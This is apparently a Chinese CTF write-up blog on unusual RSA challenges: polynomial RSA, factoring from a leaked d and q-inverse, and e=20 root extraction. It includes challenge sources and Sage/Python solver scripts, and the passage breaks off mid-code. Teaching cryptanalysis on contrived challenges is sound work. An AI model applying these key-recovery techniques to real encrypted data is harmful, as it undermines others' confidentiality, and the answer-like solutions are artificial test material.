<span class="number">1105757887</span>*x^<span class="number">139</span> + <span class="number">402111289</span>*x^<span class="number">138</span> + <span class="number">361094351</span>*x^<span class="number">137</span> + <span class="number">1788238752</span>*x^<span class="number">136</span> + <span class="number">2017677334</span>*x^<span class="number">135</span> + <span class="number">1506224550</span>*x^<span class="number">134</span> + <span class="number">648916609</span>*x^<span class="number">133</span> + <span class="number">2008973424</span>*x^<span class="number">132</span> + <span class="number">2452922307</span>*x^<span class="number">131</span> + <span class="number">1446527028</span>*x^<span class="number">130</span> + <span class="number">29659632</span>*x^<span class="number">129</span> + <span class="number">627390142</span>*x^<span class="number">128</span> + <span class="number">1695661760</span>*x^<span class="number">127</span> + <span class="number">734686497</span>*x^<span class="number">126</span> + <span class="number">227059690</span>*x^<span class="number">125</span> + <span class="number">1219692361</span>*x^<span class="number">124</span> + <span class="number">635166359</span>*x^<span class="number">123</span> + <span class="number">428703291</span>*x^<span class="number">122</span> + <span class="number">2334823064</span>*x^<span class="number">121</span> + <span class="number">204888978</span>*x^<span class="number">120</span> + <span class="number">1694957361</span>*x^<span class="number">119</span> + <span class="number">94211180</span>*x^<span class="number">118</span> + <span class="number">2207723563</span>*x^<span class="number">117</span> + <span class="number">872340606</span>*x^<span class="number">116</span> + <span class="number">46197669</span>*x^<span class="number">115</span> + <span class="number">710312088</span>*x^<span class="number">114</span> + <span class="number">305132032</span>*x^<span class="number">113</span> + <span class="number">1621042631</span>*x^<span class="number">112</span> + <span class="number">2023404084</span>*x^<span class="number">111</span> + <span class="number">2169254305</span>*x^<span class="number">110</span> + <span class="number">463525650</span>*x^<span class="number">109</span> + <span class="number">2349964255</span>*x^<span class="number">108</span> + <span class="number">626689949</span>*x^<span class="number">107</span> + <span class="number">2072533779</span>*x^<span class="number">106</span> + <span class="number">177264308</span>*x^<span class="number">105</span> + <span class="number">153948342</span>*x^<span class="number">104</span> + <span class="number">1992646054</span>*x^<span class="number">103</span> + <span class="number">2379817214</span>*x^<span class="number">102</span> + <span class="number">1396334187</span>*x^<span class="number">101</span> + <span class="number">2254165812</span>*x^<span class="number">100</span> + <span class="number">1300455472</span>*x^<span class="number">99</span> + <span class="number">2396842759</span>*x^<span class="number">98</span> + <span class="number">2398953180</span>*x^<span class="number">97</span> + <span class="number">88249450</span>*x^<span class="number">96</span> + <span class="number">1726340322</span>*x^<span class="number">95</span> + <span class="number">2004986735</span>*x^<span class="number">94</span> + <span class="number">2446249940</span>*x^<span class="number">93</span> + <span class="number">520126803</span>*x^<span class="number">92</span> + <span class="number">821544954</span>*x^<span class="number">91</span> + <span class="number">1177737015</span>*x^<span class="number">90</span> + <span class="number">676286546</span>*x^<span class="number">89</span> + <span class="number">1519043368</span>*x^<span class="number">88</span> + <span class="number">224894464</span>*x^<span class="number">87</span> + <span class="number">1742023262</span>*x^<span class="number">86</span> + <span class="number">142627164</span>*x^<span class="number">85</span> + <span class="number">1427710141</span>*x^<span class="number">84</span> + <span class="number">1504189919</span>*x^<span class="number">83</span> + <span class="number">688315682</span>*x^<span class="number">82</span> + <span class="number">1397842239</span>*x^<span class="number">81</span> + <span class="number">435187331</span>*x^<span class="number">80</span> + <span class="number">433176780</span>*x^<span class="number">79</span> + <span class="number">454834357</span>*x^<span class="number">78</span> + <span class="number">1046713282</span>*x^<span class="number">77</span> + <span class="number">1208458516</span>*x^<span class="number">76</span> + <span class="number">811240741</span>*x^<span class="number">75</span> + <span class="number">151611952</span>*x^<span class="number">74</span> + <span class="number">164192249</span>*x^<span class="number">73</span> + <span class="number">353336244</span>*x^<span class="number">72</span> + <span class="number">1779538914</span>*x^<span class="number">71</span> + <span class="number">1489144873</span>*x^<span class="number">70</span> + <span class="number">213140082</span>*x^<span class="number">69</span> + <span class="number">1874778522</span>*x^<span class="number">68</span> + <span class="number">908618863</span>*x^<span class="number">67</span> + <span class="number">1058334731</span>*x^<span class="number">66</span> + <span class="number">1706255211</span>*x^<span class="number">65</span> + <span class="number">708134837</span>*x^<span class="number">64</span> + <span class="number">1382118347</span>*x^<span class="number">63</span> + <span class="number">2111915733</span>*x^<span class="number">62</span> + <span class="number">1273497300</span>*x^<span class="number">61</span> + <span class="number">368639880</span>*x^<span class="number">60</span> + <span class="number">1652005004</span>*x^<span class="number">59</span> + <span class="number">1977610754</span>*x^<span class="number">58</span> + <span class="number">1412680185</span>*x^<span class="number">57</span> + <span class="number">2312775720</span>*x^<span class="number">56</span> + <span class="number">59793381</span>*x^<span class="number">55</span> + <span class="number">1345145822</span>*x^<span class="number">54</span> + <span class="number">627534850</span>*x^<span class="number">53</span> + <span class="number">2159477761</span>*x^<span class="number">52</span> + <span class="number">10450988</span>*x^<span class="number">51</span> + <span class="number">1479007796</span>*x^<span class="number">50</span> + <span class="number">2082579205</span>*x^<span class="number">49</span> + <span class="number">1158447154</span>*x^<span class="number">48</span> + <span class="number">126359830</span>*x^<span class="number">47</span> + <span class="number">393411272</span>*x^<span class="number">46</span> + <span class="number">2343384236</span>*x^<span class="number">45</span> + <span class="number">2191577465</span>*x^<span class="number">44</span> + <span class="number">1281188680</span>*x^<span class="number">43</span> + <span class="number">230049708</span>*x^<span class="number">42</span> + <span class="number">539600199</span>*x^<span class="number">41</span> + <span class="number">1711135601</span>*x^<span class="number">40</span> + <span class="number">1659775448</span>*x^<span class="number">39</span> + <span class="number">1716176055</span>*x^<span class="number">38</span> + <span class="number">904363231</span>*x^<span class="number">37</span> + <span class="number">2385749710</span>*x^<span class="number">36</span> + <span class="number">567278351</span>*x^<span class="number">35</span> + <span class="number">404199078</span>*x^<span class="number">34</span> + <span class="number">372670353</span>*x^<span class="number">33</span> + <span class="number">1286079784</span>*x^<span class="number">32</span> + <span class="number">1744355671</span>*x^<span class="number">31</span> + <span class="number">2316856064</span>*x^<span class="number">30</span> + <span class="number">2106475476</span>*x^<span class="number">29</span> + <span class="number">614988454</span>*x^<span class="number">28</span> + <span class="number">2149964943</span>*x^<span class="number">27</span> + <span class="number">1065233185</span>*x^<span class="number">26</span> + <span class="number">188130174</span>*x^<span class="number">25</span> + <span class="number">540415659</span>*x^<span class="number">24</span> + <span class="number">1031409799</span>*x^<span class="number">23</span> + <span class="number">1067085678</span>*x^<span class="number">22</span> + <span class="number">1005161755</span>*x^<span class="number">21</span> + <span class="number">249654085</span>*x^<span class="number">20</span> + <span class="number">1816791634</span>*x^<span class="number">19</span> + <span class="number">1437500292</span>*x^<span class="number">18</span> + <span class="number">448596413</span>*x^<span class="number">17</span> + <span class="number">2397497659</span>*x^<span class="number">16</span> + <span class="number">2353732701</span>*x^<span class="number">15</span> + <span class="number">2068949189</span>*x^<span class="number">14</span> + <span class="number">1826419168</span>*x^<span class="number">13</span> + <span class="number">1265366199</span>*x^<span class="number">12</span> + <span class="number">547031306</span>*x^<span class="number">11</span> + <span class="number">1016962374</span>*x^<span class="number">10</span> + <span class="number">160089486</span>*x^<span class="number">9</span> + <span class="number">2264803979</span>*x^<span class="number">8</span> + <span class="number">1081806194</span>*x^<span class="number">7</span> + <span class="number">824215340</span>*x^<span class="number">6</span> + <span class="number">497731793</span>*x^<span class="number">5</span> + <span class="number">45017166</span>*x^<span class="number">4</span> + <span class="number">317548920</span>*x^<span class="number">3</span> + <span class="number">1391127733</span>*x^<span class="number">2</span> + <span class="number">1752881284</span>*x + <span class="number">1290424106</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>多项式rsa，按道理，给了p应该就好分解了，但它是多项式rsa</p>
<p>看la佬的博客，有几点需要知道</p>
<ol>
<li>一般的数论知识可以完美迁移到群论上， 比如欧拉定理</li>
<li>对于欧拉函数$\varphi$来说，在数论中$\varphi (x)=x-1$（x是素数），但是对于不可约多项式$g(x)$，$\varphi(g(x))=p^n-1$（p为$GF(p)$的模，n为多项式最高项次数）。这里我暂且把$GF(p)$当成$Z_p^*$了</li>
</ol>
<p>看着代码理解吧</p>
<blockquote>
<p>解题代码</p>
</blockquote>
<p>首先构造以p为模的，关于x的多项式，这就相当于rsa中的p了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p))</span><br></pre></td></tr></table></figure>

<p>然后下面这个我不知道什么意思</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br></pre></td></tr></table></figure>

<p>接下来就是熟悉的rsa步骤，分解pq，通过上面那个求欧拉函数的公式求phi，从而求得d，然后是emmmmm，自己看吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P, Q = N.factor()</span><br><span class="line">P, Q = P[<span class="number">0</span>], Q[<span class="number">0</span>]</span><br><span class="line">phi = (p ** P.degree() - <span class="number">1</span>) * (p ** Q.degree() - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">m = c ^ d</span><br><span class="line">m = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> m.<span class="built_in">list</span>()])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>

<p>另外la佬还赠送了两个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本1</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="comment">#已知p,n,m^e</span></span><br><span class="line">p=</span><br><span class="line">P = PolynomialRing(Zmod(p), name = <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = P.gen()</span><br><span class="line">e =</span><br><span class="line">n =</span><br><span class="line">c =</span><br><span class="line"></span><br><span class="line"><span class="comment">#分解N</span></span><br><span class="line">q1, q2 = n.factor()</span><br><span class="line">q1, q2 = q1[<span class="number">0</span>], q2[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#求φ，注意求法，</span></span><br><span class="line">phi = (p**q1.degree() - <span class="number">1</span>) * (p**q2.degree() - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#取多项式系数</span></span><br><span class="line">flag = <span class="built_in">bytes</span>(m.coefficients())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: &quot;</span>, flag.decode())</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="comment">#已知p=2,n,e,c</span></span><br><span class="line">p =</span><br><span class="line">P = PolynomialRing(GF(p), name = <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = P.gen()</span><br><span class="line">e =</span><br><span class="line">n =</span><br><span class="line">R.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">2049</span>)</span><br><span class="line">c = []</span><br><span class="line"></span><br><span class="line">q1, q2 = n.factor()</span><br><span class="line">q1, q2 = q1[<span class="number">0</span>], q2[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">phi = (p**q1.degree() - <span class="number">1</span>) * (p**q2.degree() - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> cc <span class="keyword">in</span> c:</span><br><span class="line">    cc = P(R.fetch_int(cc))</span><br><span class="line">    m = <span class="built_in">pow</span>(cc,d,n)</span><br><span class="line">    m = R(P(m)).integer_representation()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    ans += <span class="built_in">chr</span>(m)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>

<p>试过了第一个可以跑，也发现.sage文件真正的用法，之前晓得了在sage里跑python文件，但是有些语法可以在sageshell里面运行，但是放在python文件中却是不行，这个时候可以将拓展名改成sage再在sage里load</p>
<p>当然还有一些py2和py3之间转换的屑</p>
<p>第二个脚本有报错，看不懂</p>
<h2 id="unusuarsa4"><a href="#unusuarsa4" class="headerlink" title="unusuarsa4"></a>unusuarsa4</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(invert(q,p))</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q_1 = <span class="number">113350138578125471637271827037682321496361317426731366252238155037440385105997423113671392038498349668206564266165641194668802966439465128197299073392773586475372002967691512324151673246253769186679521811837698540632534357656221715752733588763108463093085549826122278822507051740839450621887847679420115044512</span></span><br><span class="line">d = <span class="number">27451162557471435115589774083548548295656504741540442329428952622804866596982747294930359990602468139076296433114830591568558281638895221175730257057177963017177029796952153436494826699802526267315286199047856818119832831065330607262567182123834935483241720327760312585050990828017966534872294866865933062292893033455722786996125448961180665396831710915882697366767203858387536850040283296013681157070419459208544201363726008380145444214578735817521392863391376821427153094146080055636026442795625833039248405951946367504865008639190248509000950429593990524808051779361516918410348680313371657111798761410501793645137</span></span><br><span class="line">c = <span class="number">619543409290228183446186073184791934402487500047968659800765382797769750763696880547221266055431306972840980865602729031475343233357485820872268765911041297456664938715949124290204230537793877747551374176167292845717246943780371146830637073310108630812389581197831196039107931968703635129091224513813241403591357678410312272233389708366642638825455844282490676862737715585788829936919637988039113463707959069907015464745700766013573282604376277598510224455044288896809217461295080140187509519005245601483583507547733673523120385089098002298314719617693895392148294399937798485146568296114338393548124451378170302291</span></span><br></pre></td></tr></table></figure>

<p>两条hint</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708160443773.png" alt="unusualrsa4hint1"></p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708160508649.png" alt="unusualrsa4hint2"></p>
<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目很简介，把d告诉我们，但是没告诉n</p>
<p>可以想到d泄露攻击；可惜d泄露是分解n用的</p>
<p>但知道<br>$$<br>q_1\times q\equiv\ 1(mod\ p)<br>$$<br>可恶看着hint还是做不出来。从第一个hint可以将那个式子化简<br>$$<br>q_1\times \varphi \equiv (q_1-1)\ mod\ p<br>$$<br>这一步比较简单，有手就行，接下里有点难想；移位一下上式得到<br>$$<br>q1\times \varphi-q_1+1\equiv 0\ mod\ p<br>$$<br>即，$q_1\times \varphi-q_1+1$是p的倍数</p>
<p>令$k_p=q_1\cdot\varphi-q_1+1$，则对任意的g，$gcd(g,p)=1$，有<br>$$<br>g^\varphi \equiv1\ mod\ p\Rightarrow (g^\varphi\ mod\ k_p) \equiv1\ mod\ p<br>$$<br>这一步是由第二个hint的第二点得来的，因为p是kp的因子</p>
<p>接下来你知道怎么做了了吧</p>
<p>很好，不知道！诶嘿，我也不说，就是玩儿。</p>
<blockquote>
<p>脚本编写</p>
</blockquote>
<p>什么？你说$\varphi$不知道？——我听不见</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">q_1 = <span class="number">113350138578125471637271827037682321496361317426731366252238155037440385105997423113671392038498349668206564266165641194668802966439465128197299073392773586475372002967691512324151673246253769186679521811837698540632534357656221715752733588763108463093085549826122278822507051740839450621887847679420115044512</span></span><br><span class="line">d = <span class="number">27451162557471435115589774083548548295656504741540442329428952622804866596982747294930359990602468139076296433114830591568558281638895221175730257057177963017177029796952153436494826699802526267315286199047856818119832831065330607262567182123834935483241720327760312585050990828017966534872294866865933062292893033455722786996125448961180665396831710915882697366767203858387536850040283296013681157070419459208544201363726008380145444214578735817521392863391376821427153094146080055636026442795625833039248405951946367504865008639190248509000950429593990524808051779361516918410348680313371657111798761410501793645137</span></span><br><span class="line">c = <span class="number">619543409290228183446186073184791934402487500047968659800765382797769750763696880547221266055431306972840980865602729031475343233357485820872268765911041297456664938715949124290204230537793877747551374176167292845717246943780371146830637073310108630812389581197831196039107931968703635129091224513813241403591357678410312272233389708366642638825455844282490676862737715585788829936919637988039113463707959069907015464745700766013573282604376277598510224455044288896809217461295080140187509519005245601483583507547733673523120385089098002298314719617693895392148294399937798485146568296114338393548124451378170302291</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="comment"># 枚举phi</span></span><br><span class="line">    t = e * d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> t % k == <span class="number">0</span>:</span><br><span class="line">        phi = t // k</span><br><span class="line">        kp = q_1 * phi - q_1 + <span class="number">1</span></span><br><span class="line">        x1 = <span class="built_in">pow</span>(<span class="number">3</span>, phi, kp) - <span class="number">1</span></span><br><span class="line">        x2 = <span class="built_in">pow</span>(<span class="number">5</span>, phi, kp) - <span class="number">1</span></span><br><span class="line">        x = gcd(x1, x2)</span><br><span class="line">        <span class="keyword">if</span> x.bit_length() == <span class="number">1024</span>:</span><br><span class="line">            p = x</span><br><span class="line">            q = invert(q_1, p)</span><br><span class="line">            n, phi = p*q, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">assert</span> d == invert(e, phi)</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>我看着showwp上大佬写的，我直接用3和5作为那个质数了，理论上应该选任意两个都可以的吧</p>
<h2 id="unusualrsa5"><a href="#unusualrsa5" class="headerlink" title="unusualrsa5"></a>unusualrsa5</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x14</span></span><br><span class="line">p = <span class="number">733089589724903586073820965792963746076789390539824437962807679954808310072656817423828613938510684864567664345751164944269489647964227519307980688068059059377123391499328155025962198363435968318689113750910755244276996554328840879221120846257832190569086861774466785101694608744384540722995426474322431441</span></span><br><span class="line">q = <span class="number">771182695213910447650732428220054698293987458796864628535794956332865106301119308051373568460701145677164052375651484670636989109023957702790185901445649197004100341656188532246838220216919835415376078688888076677350412398198442910825884505318258393640994788407100699355386681624118606588957344077387058721</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#406314720119562590605554101860453913891646775958515375190169046313074168423687276987576196367702523895650602252851191274766072774312855212771035294337840170341052016067631007495713764510925931612800335613551752201920460877432379214684677593342046715833439574705829048358675771542989832566579493199671622475225225451781214904100440695928239014046619329247750637911015313431804069312072581674845078940868349474663382442540424342613429896445329365750444298236684237769335405534090013035238333534521759502103604033307768304224154383880727399879024077733935062478113298538634071453067782212909271392163928445051705642</span></span><br></pre></td></tr></table></figure>

<p>放了一个hint</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708175122579.png" alt="unusualrsa5hint"></p>
<blockquote>
<p>解题思路</p>
</blockquote>
<p>来了，终于来了</p>
<p>有限域开方，先纪念一下Striving师傅给的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">p = <span class="number">733089589724903586073820965792963746076789390539824437962807679954808310072656817423828613938510684864567664345751164944269489647964227519307980688068059059377123391499328155025962198363435968318689113750910755244276996554328840879221120846257832190569086861774466785101694608744384540722995426474322431441</span></span><br><span class="line">q = <span class="number">771182695213910447650732428220054698293987458796864628535794956332865106301119308051373568460701145677164052375651484670636989109023957702790185901445649197004100341656188532246838220216919835415376078688888076677350412398198442910825884505318258393640994788407100699355386681624118606588957344077387058721</span></span><br><span class="line">n = <span class="number">9057141637995599750120273501711128117576789048411357158233050845658505488383724832915968443730006384810721595601723748471745315354759415044859624198755098491311647992728384572103262800310263916249536898582100747311978019829291619921741682336800665277699122504431456051606407509905004993708771825443764723285750825546500765451509998514747599779552241055519485714649825416851221219747115910385536482995890893190128149999622905611239433481756073333147782531765685320972075370276543786386451560493093416152466142374684450770169257924330366774896526508005296520372463932722237001341584625279676089901419404816917142209281664709940400762785892142918132066900664643155176180059403739</span></span><br><span class="line">c = <span class="number">406314720119562590605554101860453913891646775958515375190169046313074168423687276987576196367702523895650602252851191274766072774312855212771035294337840170341052016067631007495713764510925931612800335613551752201920460877432379214684677593342046715833439574705829048358675771542989832566579493199671622475225225451781214904100440695928239014046619329247750637911015313431804069312072581674845078940868349474663382442540424342613429896445329365750444298236684237769335405534090013035238333534521759502103604033307768304224154383880727399879024077733935062478113298538634071453067782212909271392163928445051705642</span></span><br><span class="line">e= <span class="number">20</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        <span class="comment"># 普普通通中国剩余定理</span></span><br><span class="line">        m = crt(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>之前中国海洋大学那道题是e=64，要分成16*4或者8*8来做</p>
<p>此外，还有几种不可行的思路</p>
<p>老办法rabin，但是20=2*2*5每一个质数都和phi有公因子，巧了</p>
<p>就算最后开到$c^5$，用小指数的脚本也跑不出来</p>
<p>对于5，平方根算法也无能为力</p>
<p>好吧，该来总会来的</p>
<blockquote>
<p>有限域开方</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f.roots()</span><br></pre></td></tr></table></figure>

<p>好，结束！</p>
<p>其实有限域开方和rabin挺像，一个可以开多次，一个只能开二次</p>
<p>以模p下的为例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br></pre></td></tr></table></figure>

<p>求出来的解（可能有多个，因为多项式的解嘛），然后继续开，可能一次开的次数不能太大，不然时间会很慢，然后用中国剩余定理，因为求出来的解都是在模各自模数下的</p>
<p>至于里面什么原理，达斯给碟</p>
<p>la佬yyds，看着la佬的博客长大</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708203043872.png" alt="image-20210708203043872"></p>
<p>看看la佬推荐的两道题目</p>
<h3 id="De1CTF2019-Baby-RSA"><a href="#De1CTF2019-Baby-RSA" class="headerlink" title="De1CTF2019-Baby RSA"></a>De1CTF2019-Baby RSA</h3><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> e1,e2,p,q1p,q1q,hint,flag</span><br><span class="line"></span><br><span class="line">n =  [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c =  [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line">f=<span class="keyword">lambda</span> m,e,n,c:<span class="built_in">pow</span>(m,e,n)==c</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">sum</span>(<span class="built_in">map</span>(f,[p]*<span class="number">4</span>,[<span class="number">4</span>]*<span class="number">4</span>,n,c))==<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 =  <span 